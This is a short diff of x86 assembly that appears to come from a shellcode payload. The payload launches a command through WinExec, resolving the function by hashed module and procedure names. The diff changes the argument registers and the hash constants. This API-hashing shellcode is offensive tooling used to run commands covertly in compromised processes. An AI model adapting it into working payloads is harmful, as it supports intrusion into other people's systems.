@@ -11,14 +11,15 @@ entry:
   flag_CEA:                             ; flag for calculate entry address
 
   ; call "kernel32.dll, WinExec"
-  lea edx, [ebx+command]                ; lpCmdLine
-  xor ecx, ecx                          ; clear ecx
-  mov cl, [ebx+cmd_show]                ; set uCmdShow
-  push ecx                              ; push uCmdShow
-  push edx                              ; push lpCmdLine
+  lea ecx, [ebx+command]                ; lpCmdLine
+  xor edx, edx                          ; clear edx
+  mov dl, [ebx+cmd_show]                ; set uCmdShow
+  push edx                              ; push uCmdShow
+  push ecx                              ; push lpCmdLine
   push 2                                ; set num arguments
-  push 0x61DA2999                       ; set hash key
-  push 0x0AE20914                       ; set function hash
+  push 0x4D5AF344                       ; set hash key
+  push 0xFB16D6BD                       ; set procedure name hash
+  push 0x21F98D89                       ; set module name hash
   call api_call                         ; call api function
 
   ; restore context
